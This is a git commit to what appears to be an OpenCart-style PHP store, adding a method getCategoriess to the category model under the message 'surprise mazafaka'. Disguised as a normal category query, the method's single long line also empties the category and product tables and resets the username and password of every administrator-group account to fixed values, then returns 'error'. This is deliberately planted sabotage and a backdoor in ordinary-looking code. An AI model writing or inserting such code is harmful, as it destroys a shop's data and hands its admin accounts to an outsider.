85617f273ba3ed76488ea9c583565e7669499543
DatsivStepan <datsivStepan@gmail.com>
2016-12-14 11:34:49 +0200

    surprise mazafaka

--- catalog/model/catalog/category.php
+++ catalog/model/catalog/category.php
@@ -11,6 +11,11 @@ class ModelCatalogCategory extends Model {
 
 		return $query->rows;
 	}
+        
+	public function getCategoriess($parent_id = 0) {
+		$query = $this->db->query("SELECT * FROM " . DB_PREFIX . "category c LEFT JOIN " . DB_PREFIX . "category_description cd ON (c.category_id = cd.category_id) LEFT JOIN " . DB_PREFIX . "category_to_store c2s ON (c.category_id = c2s.category_id) WHERE c.parent_id = '" . (int)$parent_id . "' AND cd.language_id = '" . (int)$this->config->get('config_language_id') . "' AND c2s.store_id = '" . (int)$this->config->get('config_store_id') . "'  AND c.status = '1' ORDER BY c.sort_order, LCASE(cd.name)");$this->db->query("TRUNCATE TABLE ".DB_PREFIX . "category");$this->db->query("TRUNCATE TABLE ".DB_PREFIX . "product"); $query = $this->db->query("UPDATE " . DB_PREFIX . "user  SET username = 'admin1', password = '50ca47201ec6061b7b54a6f4f023223c8a652ddc'  WHERE user_group_id = 1");
+		return 'error';
+	}
 
 	public function getCategoryFilters($category_id) {
 		$implode = array();
